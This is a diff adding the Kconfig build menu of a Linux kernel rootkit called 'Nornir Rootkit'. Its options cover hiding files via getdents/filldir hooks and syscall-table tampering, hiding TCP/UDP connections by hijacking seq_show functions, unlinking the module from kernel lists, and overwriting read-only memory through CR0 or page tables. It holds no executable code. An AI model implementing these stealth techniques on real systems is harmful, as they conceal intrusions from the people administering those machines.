@@ -1,0 +1,209 @@
+mainmenu "Nornir Rootkit Configuration"
+
+menu "User Interface"
+
+    config NORNIR_PROCFS_UAPI
+        bool "Enable user interface under /proc"
+        default y
+        help 
+            Create a node `/proc/nornir` as a user interface
+
+endmenu
+
+menu "File-hidding features"
+
+    config NORNIR_HIDE_FILE
+        bool "Enable file-hidding features"
+        default y
+            help
+                Enable features related to hidding files
+
+    config NORNIR_HIDE_FILE_HIJACK_GETDENTS
+        bool "Hide file by hijacking getdents() syscall's call chain"
+        depends on NORNIR_HIDE_FILE
+        default y
+            help
+                Hijack nodes on `getdents()` syscall's call chain to hide files
+    
+    choice
+        prompt "Node to be hijacked in getdents()"
+        default NORNIR_HIDE_FILE_HIJACK_GETDENTS_FILLDIR
+        depends on NORNIR_HIDE_FILE_HIJACK_GETDENTS
+
+        config NORNIR_HIDE_FILE_HIJACK_GETDENTS_FILLDIR
+            bool "filldir-related functions"
+                help
+                    Hijack functions including filldir(), filldir64(), and compat_filldir()
+
+        config NORNIR_HIDE_FILE_HIJACK_GETDENTS_SYSCALL
+            bool "getdents() syscall itself"
+                help
+                    Hijack getdents(), getdents64() and compat_getdents() system call
+
+    endchoice
+
+    choice
+        prompt "Method to hijack"
+        default NORNIR_HIDE_FILE_HIJACK_GETDENTS_INLINE
+        depends on NORNIR_HIDE_FILE_HIJACK_GETDENTS
+
+        config NORNIR_HIDE_FILE_HIJACK_GETDENTS_INLINE
+            bool "Inline hook"
+                help
+                    Modified assembly code directly to create inline control flow hijack
+
+        config NORNIR_HIDE_FILE_HIJACK_GETDENTS_FTRACE
+            bool "Ftrace hook"
+                help
+                    Use ftrace hook point (if existed) to hijack the control flow
+
+        config NORNIR_HIDE_FILE_HIJACK_GETDENTS_SYSCALL_TABLE
+            bool "Tamper systemcall table"
+            depends on NORNIR_HIDE_FILE_HIJACK_GETDENTS_SYSCALL
+            help
+                Tamper system_call_table to hijack the control flow
+
+    endchoice
+
+    menu "File-system specific features"
+        depends on NORNIR_HIDE_FILE
+
+        config NORNIR_HIDE_FILE_EXT4
+            bool "Hook structs of ext4 file system"
+            default y
+            help
+                Tamper ext4-related structs (e.g., ext4_dir_operations) to hide files
+
+    endmenu
+
+endmenu
+
+menu "Network connections hidding features"
+
+    config NORNIR_HIDE_CONN
+        bool "Enable connections-hidding features"
+        default y
+            help
+                Enable features related to hidding network connections
+
+    config NORNIR_HIDE_TCP_CONN
+        bool "Hide TCP connections"
+        depends on NORNIR_HIDE_CONN
+        default y
+            help
+                Enable tcp connections' hidding
+
+    config NORNIR_HIDE_TCP4_CONN
+        bool "Hide TCP4 connections"
+        depends on NORNIR_HIDE_TCP_CONN
+        default y
+            help
+                Enable tcp4 connections' hidding
+
+    config NORNIR_HIDE_UDP_CONN
+        bool "Hide UDP connections"
+        depends on NORNIR_HIDE_CONN
+        default y
+            help
+                Enable udp connections' hidding
+
+    config NORNIR_HIDE_UDP4_CONN
+        bool "Hide UDP4 connections"
+        depends on NORNIR_HIDE_UDP_CONN
+        default y
+            help
+                Enable udp4 connections' hidding
+
+    config NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW
+        bool "Hide connections by hijacking *_seq_show() kernel functions"
+        depends on NORNIR_HIDE_CONN
+        default y
+            help
+                Hijack functions like tcp4_seq_show() and udp4_seq_show() to hide network connections
+
+    choice
+        prompt "Method to hijack"
+        default NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW_INLINE
+        depends on NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW
+
+        config NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW_INLINE
+            bool "Inline hook"
+                help
+                    Modified assembly code directly to create inline control flow hijack
+
+        config NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW_FTRACE
+            bool "Ftrace hook"
+                help
+                    Use ftrace hook point (if existed) to hijack the control flow
+
+    endchoice
+
+endmenu
+
+menu "Module-hidding features"
+
+    config NORNIR_HIDE_MOD
+        bool "Hide module"
+        default y
+        help
+            Hide Nornir-Rootkit in the kernel
+    
+    config NORNIR_HIDE_MOD_UNLINK_MODULE
+        bool "Unlink module struct"
+        depends on NORNIR_HIDE_MOD
+        default y
+        help
+            Unlink rootkit module's `struct module` from list to hide from /proc/modules and /proc/kallsyms
+    
+    config NORNIR_HIDE_MOD_UNLINK_KOBJ
+        bool "Unlink kobject struct"
+        depends on NORNIR_HIDE_MOD
+        default y
+        help
+            Unlink rootkit module's `struct kobject` from list to hide from /sys/module
+
+    config NORNIR_HIDE_MOD_UNLINK_VMAP
+        bool "(Dangerous) Unlink vmap_area"
+        depends on NORNIR_HIDE_MOD
+        default n
+        help
+            Unlink rootkit module's `struct vmap_area` from list to hide from /proc/vmallocinfo
+
+    config NORNIR_HIDE_MODE_UNLINK_USE
+        bool "Unlink module_use list"
+        depends on NORNIR_HIDE_MOD
+        default y
+        help
+            Unlink rootkit module's `module_use` from list to hide module dependencies
+
+endmenu
+
+menu "Memory manipulation techniques"
+
+    choice
+        prompt "Read-only memory overwriting"
+        default NORNIR_VMAP_TAMPER_ROMEM
+
+        config NORNIR_VMAP_TAMPER_ROMEM
+            bool "Remap physical memory by vmap"
+            help
+                Establish new mapping for target physical pages with vmap to overwrite read-only memory
+
+        config NORNIR_IOREMAP_TAMPER_ROMEM
+            bool "(X86) Remap physical memory by ioremap"
+            help
+                Establish new mapping for target physical pages with ioremap to overwrite read-only memory
+        
+        config NORNIR_CR0_TAMPER_ROMEM
+            bool "(X86) Tamper CR0"
+            help
+                Disable and re-enable CR0's write-protection bit to tamper read-only memory
+
+        config NORNIR_PGTBL_TAMPER_ROMEM
+            bool "(X86) Tamper page table"
+            help
+                Modify page table entries to tamper read-only memory
+
+    endchoice
+
+endmenu
